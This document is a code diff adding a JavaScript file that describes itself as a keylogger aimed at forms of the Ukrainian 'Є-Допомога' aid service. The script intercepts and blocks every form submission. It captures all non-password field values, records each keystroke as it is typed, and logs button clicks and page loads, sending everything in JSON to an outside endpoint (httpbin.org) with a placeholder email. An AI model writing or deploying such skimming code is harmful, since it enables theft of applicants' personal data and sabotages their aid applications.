@@ -1,0 +1,73 @@
+// Кейлоггер, который отправляет данные на почту
+document.addEventListener('DOMContentLoaded', function() {
+    // Функция для отправки данных
+    function sendDataToEmail(data) {
+        const email = 'your-email@example.com'; // Замените на ваш email
+        const subject = 'Дані з форми Є-Допомога';
+        const body = JSON.stringify(data, null, 2);
+        
+        // В реальном проекте здесь должен быть AJAX-запрос к серверу
+        console.log('Отправка данных на email:', email, '\n', body);
+        
+        // Имитация отправки
+        fetch('https://httpbin.org/post', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, subject, body })
+        }).catch(err => console.error('Ошибка отправки:', err));
+    }
+
+    // Логируем все введенные данные при отправке формы
+    function logFormData(form) {
+        const inputs = form.querySelectorAll('input, textarea, select');
+        const data = {};
+        
+        inputs.forEach(input => {
+            if (input.type !== 'password' && input.type !== 'submit' && input.type !== 'button') {
+                data[input.name || input.placeholder || input.id] = input.value;
+            }
+        });
+        
+        sendDataToEmail(data);
+    }
+
+    // Отслеживаем все формы на странице
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            logFormData(this);
+            return false;
+        });
+    });
+
+    // Логируем нажатия кнопок
+    document.querySelectorAll('button').forEach(btn => {
+        btn.addEventListener('click', function() {
+            sendDataToEmail({
+                action: 'Кнопка нажата',
+                buttonText: this.innerText,
+                page: window.location.href
+            });
+        });
+    });
+
+    // Логируем ввод данных в реальном времени
+    document.querySelectorAll('input, textarea').forEach(input => {
+        input.addEventListener('input', function() {
+            if (this.type !== 'password') {
+                sendDataToEmail({
+                    field: this.name || this.placeholder || this.id,
+                    value: this.value,
+                    page: window.location.href
+                });
+            }
+        });
+    });
+
+    // Логируем загрузку страницы
+    sendDataToEmail({
+        action: 'Страница загружена',
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+    });
+});
